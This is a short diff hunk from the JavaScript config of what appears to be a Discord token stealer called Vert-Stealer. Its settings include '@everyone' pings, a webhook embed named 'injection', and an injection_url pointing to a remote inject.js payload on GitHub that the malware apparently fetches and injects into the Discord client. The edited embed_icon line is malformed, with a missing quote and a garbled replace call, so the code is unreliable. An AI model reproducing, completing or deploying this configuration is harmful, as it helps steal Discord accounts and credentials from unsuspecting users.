@@ -12,7 +12,7 @@ const config = {
   ping_on_run: true, 
   ping_val: '@everyone', 
   embed_name: 'injection', 
-  embed_icon: 'https://cdn.discordapp.com/attachments/961950134814535700/961987421879287878/IMG_9854.png'.replace(/ /g, '%20'), 
+  embed_icon: 'https://freeimage.host/i/K16IiG9(/ /g, '%20'), 
   embed_color: 8363488,
   injection_url: 'https://raw.githubusercontent.com/VertX00D/Vert-Stealer/main/Injection/inject.js', 
   /**
